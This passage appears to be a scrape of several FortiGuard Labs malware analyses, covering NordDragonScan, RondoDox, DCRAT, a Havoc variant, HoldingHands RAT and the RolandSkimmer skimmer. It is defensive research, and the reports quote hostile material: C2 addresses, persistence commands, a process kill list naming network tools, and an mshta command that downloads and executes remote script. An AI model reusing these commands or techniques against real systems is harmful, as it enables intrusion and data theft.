temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and .NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles.

    "link": "https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat",
    "content": "FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. dhpcd apcid redtail xmrig miner ps top htop pstree lsof netstat ss wireshark tshark ngrep dumpcap tcpdump passwd chpasswd iptables nc netcat ufw gdb gdbserver cgdb strace valgrind stap dtrace sysdig bpftrace scp shutdown poweroff halt reboot During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name Iptables jsuJpf ufw nqqbsc passwd ahwdze chpasswd ereghx shutdown hhrqwk poweroff dcwkkb halt cjtzgw reboot gaajct After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies.

    "content": "FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\Windows\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a .NET library to download thethird and final payload from the reversed URL to C:\\Users\\Public\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string.

Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\"FULL PATH OF THE EXECUTABLE\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\Local\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\AppData\\Local\\Temp\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi.Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a .NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent.CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document.

    "content": "FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\Windows\\System32\\drivers\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\Windows\\SYSTEM32\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. Offset Comments +00h The data size, 0xFA. +04h Magic value, 0xDEADBEEF. +08h Agent ID, 0x67C54600. +0Ch Command ID, 0x63. DEMON_INIT. +10h Request ID, 0x0. +14h AES Key, 20h bytes. +34h AES IV, 10h bytes. +44h The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below.

Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High In January 2025, FortiGuard Labs observed an attack targeting users in Taiwan. The threat actor is spreading the malware known as winos 4.0 via an email masquerading as being from Taiwan's National Taxation Bureau. Through continued monitoring, we identified further malware samples associated with this campaign. Among the new samples, a phishing email was sent in March 2025 with an attachment that contained a link used in another attack campaign. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first link belongs to the domain twszz[.]xin, which follows a similar naming pattern to the campaign targeting users in Taiwan. The second link directs to an image file about tax inspection, while the HTML filename claims to include account statement details. This link enabled us to trace the attack and identify additional malware samples, along with further links. Figure 2 provides a simplified threat map. The files on the left side of Figure 2 are XLS files used in campaigns that took place in June 2024. Over the past few months, this threat group has deployed malware based on the HoldingHands RAT (Remote Access Trojan), also known as Gh0stBins, to compromise users in Taiwan. The malware typically comprises multiple files embedded within a ZIP file and is distributed via phishing emails. Phishing emails typically masquerade as messages from the government or business partners, using topics such as taxes, pensions, invoices, and other subjects that prompt the recipient to immediately click on or open an attachment. Sometimes, the email content can be a picture with a hyperlink that asks the recipient to click on it, inadvertently downloading the malware. The attached PDF file uses content related to the phishing email to trick the recipient into opening the link. In newer attack chains, the link leads to a download page. The malware download page looks much simpler than the PDF file and email. It only contains text and a download button. In some attack chains, the malware is embedded in a password-protected ZIP file, and the password is on the download page. This prevents analysts who get the ZIP file but don't have access to the download page from opening it. Multiple files are used during the attack, including legitimate executable files and necessary DLL files, encrypted shellcode, and shellcode loaders. The shellcode loaders, which decrypt and execute the encrypted shellcode, are DLL files loaded by a legitimate executable via side-loading. Figure 8 shows an example of the files embedded in the ZIP file and the execution flow.條例檔案is the legitimate executable file used to loaddokan2.dllvia side-loading. In addition to the main execution flow, encrypted shellcodes support persistence, and empty files provide unique filenames. Although the ZIP files downloaded from different PDF files and webpages may have varying folder structures and files, their execution flows are similar to those shown in Figure 8. Sometimes, the ZIP file only contains an executable that drops the duplicate files observed in other chains. According to the image debug directory of the executable file, the malware is based on the HoldingHands Remote Access Trojan (RAT). Over the past two months, the ZIP file has included a text file containing the passwords for other files in the ZIP file, which makes detection more difficult. Dokan2.dll creates a thread to decrypt data indxpi.txtand execute it. Before this, it calls theShowWindowfunction to hide the executable's window for side-loading. It then searches forkernel32.dllandDwhsOqnbdrr.dllby comparing the lengths of the filenames of the files extracted from the ZIP file. DwhsOqnbdrr.dllis an empty file. By shifting each letter in the filename “DwhsOqnbdrr”forward one position in the alphabet, it becomesExitProcessand loads the function from thekernel32.dllit just found. It replaces the address of theExitProcessfunction in the import table with the address of a function that calls theWaitForSingleObjectfunction to wait for a signal from the thread that decryptsdxpi.txt. When the thread finishes, it calls theExitProcessfunction that it just loaded. In the thread, it executesthe條例檔案as an administrator if it doesn’t have high enough privileges. Then it searches forcollalautriv.xmland converts the filename to getVirtualAlloc, the API used in decryption. dxpi.txtexecutes initial setups for the next stage, including anti-VM, privilege escalation, and installation. Subkey: SOFTWARE\\MsUpTas Value name: State Value: 1 In addition, it drops other files extracted from the ZIP file to C:\\Program Files (x86)\\WindowsPowerShell\\Update.

In addition, it terminates ifBrokerClientCallback.dllandBlend.dllare present, indicating that the computer is infected.Blend.dllis thelegitimatemsimg32.dllthat is later renamed bymsvchost.dat. After installation, it executesTaskServer.exe, which loadsdokan2.dllvia side-loading. Dokan2.dllthendecrypts and executes the shellcode inmsgDb.datfor the next stage. Original Filename Filename of dropped file Description msgDb.dat system.dat, mymsc.nls The malicious payload. dokan2.dll dokan2.dll Shellcode loader formsgDb.dat. libEGL.dll libEGL.dll The legitimate DLL file for條例檔案. TaskServer.exe taskyhost.exe The same file as the條例檔案. simg64.dll msimg32.dll Shellcode loader forsystem.dat. MsgDb.datimplements C2 tasks for setting registry keys, data collection, and module download from the HoldingHands RAT. It also sends heartbeat packets to ensure the connection is active. Below is the packet's data structure, excluding the header. The packets frommsgDb.datand the C2 server follow this structure. 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 Magic Data size Unused Command 1 Payload(optional) ⁞ ⁞ Magic: 0xDEADBEEFData size: The size of the command and the payload The first outgoing packet doesn’t contain a payload. TheKNELcommand indicates that the packet is from a kernel module. As a response, the C2 server sends a data collection request. After sending the user information,msgDb.datsends heartbeat packets and waits for further instructions. The response command is 0x00. To get the install date, it reads theInstallDatevalue from the SOFTWARE\\HHClient registry key. If this is the first time the C2 server queries for this information, it writes the current time to the value. The registry values set by other commands areCommentandGroupfrom the SOFTWARE\\HHClient registry key. If theCommentvalue is not set, it writesdefaultto the packet. Once all data is downloaded,msgDb.datexecutes the module. Otherwise, it sends 0x0B to ask for more data. During our analysis, we identified three modules delivered by the C2 server, including two remote desktop modules and a file manager.msgDb.datcalls the only export function, ModuleEntry, to proceed to the next stage of the attack. Below are the commands in the initial packet: Module name Command Description rd RDTP Remote desktop rd_dxgi RDTP Remote desktop filemgr FMGR File manager The packets follow the same structure asmsgDb.dat. The modules' image debug directories indicate that they also belong to the HoldingHands RAT. Some modules appear to be simplified versions, as indicated by the term 'jingjianban' (meaning 'lite version' in Chinese) in the Image Debug Directory. In addition towinos, which we covered in February 2025, and HoldingHands, discussed in this article, this threat group frequently employs Gh0stCringe. Figures 5 through 7 include screenshots of files in this attack chain. This analysis revealed further malware samples associated with the attack that began targeting Taiwan in January 2025. The attack chain comprises numerous snippets of shellcode and loaders, making the attack flow complex. However, the purpose of these samples is to execute a malicious payload that accesses a C2 server to receive further instructions. Across winos, HoldingHands, and Gh0stCring, this threat group continuously evolves its malware and distribution strategies. FortiGuard will continue to monitor these attack campaigns and provide appropriate protections as required.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High Web-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection. The attacker first spreads a malicious ZIP file named “faktura_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura_1065170.lnk.” This shortcut covertly executes the following hidden command: C:\\WiNDOws\\SYsTEM32\\MShTA.exe vbscript:execute(\"SeT mi1=CReATeobjECt(\\\"msxmL2.SErverXMlHTtp.6.0\\\"):mi1.OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\\\",faLSe:mi1.SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1.REsponSEtEXt,\\\"#\\\", R)):\")(wiNDoW.ClosE) The page “ipa.AsPX” 